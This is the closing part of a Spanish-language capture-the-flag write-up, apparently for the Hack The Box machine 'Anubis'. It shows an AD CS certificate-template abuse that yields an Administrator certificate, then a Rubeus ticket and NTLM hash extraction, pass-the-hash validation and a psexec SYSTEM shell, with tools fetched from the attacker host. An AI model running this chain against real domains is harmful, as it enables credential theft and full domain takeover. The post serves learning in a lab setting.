      Owner: BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY<span class="se">\A</span>uthenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN<span class="se">\A</span>dministrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
      Allow  ManageCA, ManageCertificates               WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
    Enrollment Agent Restrictions : None

<span class="o">[</span>+] No Vulnerable Certificates Templates found!

    CA Name                               : earth.windcorp.htb<span class="se">\w</span>indcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
      Object Control Permissions
        Owner                       : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
        Full Control Principals     : WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteOwner Principals       : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteDacl Principals        : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteProperty Principals    : WINDCORP<span class="se">\A</span>dministrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP<span class="se">\D</span>omain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP<span class="se">\E</span>nterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP<span class="se">\w</span>ebdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290



Certify completed <span class="k">in </span>00:00:12.5821066
</code></pre></div></div>

<ul>
  <li>Vamos a explotar el Template <code class="language-plaintext highlighter-rouge">Web</code> tiene el grupo <code class="language-plaintext highlighter-rouge">WINDCORP\webdevelopers</code> asignado como <code class="language-plaintext highlighter-rouge">Owner</code> y nuestro usuario pertenece a ese grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; net user diegocruz
User name                    DiegoCruz
Full Name
Comment
User<span class="s1">'s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 6:42:38 PM
Password expires             Never
Password changeable          5/27/2021 6:42:38 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/14/2024 8:51:41 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *webdevelopers
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar el siguiente script en powershell para explotarlo <a href="https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1">https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1</a>.</p>
  </li>
  <li>
    <p>El problema de esta máquina es sus UPN (User Principal Name) están mal estos se usan para identificar a un usuario en un dominio casi siempre es <code class="language-plaintext highlighter-rouge">nombre@dominio</code> nuestro usuario tiene <code class="language-plaintext highlighter-rouge">.thm</code> esto puedo causar problemas y en el .ps1 es donde se esta usando.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nv">$TargetUPN</span> <span class="o">=</span> <span class="nv">$user</span>.userprincipalname
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span> <span class="o">=</span> Get-ADUser <span class="nt">-Identity</span> DiegoCruz <span class="nt">-Properties</span> UserPrincipalName
PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span>.UserPrincipalName
Diego.Cruz@windcorp.thm
</code></pre></div></div>

<ul>
  <li>Lo que vamos hacer es cambiar la línea de código para que se identifique con el <code class="language-plaintext highlighter-rouge">samaccountname</code> que no tiene .thm para no obtener errores.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span> <span class="o">=</span> Get-ADUser <span class="nt">-Identity</span> DiegoCruz <span class="nt">-Properties</span> SamAccountName
PS C:<span class="se">\P</span>rogramData&gt; <span class="nv">$user</span>.SamAccountName
DiegoCruz
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>ADCS.ps1 | <span class="nb">grep </span>samaccountname
    <span class="nv">$TargetUPN</span> <span class="o">=</span> <span class="nv">$user</span>.samaccountname
</code></pre></div></div>

<ul>
  <li>Ahora vamos a moverlo a la máquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; curl http://10.10.14.74/ADCS.ps1 <span class="nt">-o</span> ADCS.ps1
</code></pre></div></div>

<ul>
  <li>También vamos a necesitar <code class="language-plaintext highlighter-rouge">PowerView</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; curl http://10.10.14.74/PowerView.ps1 <span class="nt">-o</span> PowerView.ps1
</code></pre></div></div>

<ul>
  <li>Ahora importarnos los módulos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; Import-Module .<span class="se">\P</span>owerView.ps1
PS C:<span class="se">\P</span>rogramData&gt; Import-Module .<span class="se">\A</span>DCS.ps1
</code></pre></div></div>

<ul>
  <li>Ahora vamos por el certificado pasándole el nombre del template y el usuario que queremos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; Get-SmartCardCertificate <span class="nt">-Identity</span> Administrator <span class="nt">-TemplateName</span> Web <span class="nt">-NoSmartCard</span>
</code></pre></div></div>

<ul>
  <li>Ahora tenemos el certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; <span class="nb">dir </span>Cert:<span class="se">\C</span>urrentUser<span class="se">\M</span>y


   PSParentPath: Microsoft.PowerShell.Security<span class="se">\C</span>ertificate::CurrentUser<span class="se">\M</span>y

Thumbprint                                Subject
<span class="nt">----------</span>                                <span class="nt">-------</span>
F1D2CE4A7727B4A4ED1414302EE5E887063838FB
</code></pre></div></div>

<ul>
  <li>Ahora usamos Rubeus para obtener el hash<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\R</span>ubeus.exe asktgt /user:Administrator /certificate:F1D2CE4A7727B4A4ED1414302EE5E887063838FB /getcredentials

   ______        _
  <span class="o">(</span>_____ <span class="se">\ </span>     | |
   _____<span class="o">)</span> <span class="o">)</span>_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ <span class="se">\|</span> ___ | | | |/___<span class="o">)</span>
  | |  <span class="se">\ \|</span> |_| | |_<span class="o">)</span> <span class="o">)</span> ____| |_| |___ |
  |_|   |_|____/|____/|_____<span class="o">)</span>____/<span class="o">(</span>___/

  v2.2.0

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Action: Ask TGT

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using PKINIT with etype rc4_hmac and subject:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Building AS-REQ <span class="o">(</span>w/ PKINIT preauth<span class="o">)</span> <span class="k">for</span>: <span class="s1">'windcorp.htb\Administrator'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using domain controller: fe80::95fd:7c69:ca2c:4d61%10:88
<span class="o">[</span>+] TGT request successful!
<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="nb">base64</span><span class="o">(</span>ticket.kirbi<span class="o">)</span>:

      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
      <span class="nv">MTc0NFqoDhsMV0lORENPUlAuSFRCqSEwH6ADAgECoRgwFhsGa3JidGd0Gwx3aW5kY29ycC5odGI</span><span class="o">=</span>

  ServiceName              :  krbtgt/windcorp.htb
  ServiceRealm             :  WINDCORP.HTB
  UserName                 :  Administrator
  UserRealm                :  WINDCORP.HTB
  StartTime                :  7/14/2024 11:17:44 PM
  EndTime                  :  7/15/2024 9:17:44 AM
  RenewTill                :  7/21/2024 11:17:44 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64<span class="o">(</span>key<span class="o">)</span>              :  <span class="nv">ilnUan6u3cm7e372x044og</span><span class="o">==</span>
  ASREP <span class="o">(</span>key<span class="o">)</span>              :  2778BBEAF9B6991B0EFAD85F81EBA582

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : 3CCC18280610C6CA3156F995B5899E09
PS C:<span class="se">\P</span>rogramData&gt;
</code></pre></div></div>

<ul>
  <li>Vemos que es correcto.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> Administrator <span class="nt">-H</span> 3CCC18280610C6CA3156F995B5899E09
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\A</span>dministrator:3CCC18280610C6CA3156F995B5899E09 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos conectarnos y ver la root flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-psexec windcorp.htb/Administrator@earth.windcorp.htb <span class="nt">-hashes</span> :3CCC18280610C6CA3156F995B5899E09
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on earth.windcorp.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file aLLnjNcY.exe
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on earth.windcorp.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service Efnp on earth.windcorp.htb.....
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service Efnp.....
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
Microsoft Windows <span class="o">[</span>Version 10.0.17763.2114]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
8a4cae54d70626a3512d970aeecd52b6

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/insane/2024/07/14/anubis.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_darkhorse77?igsh=MWZqYTAyYnJmYWZrdg%3D%3D&utm_source=qr" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
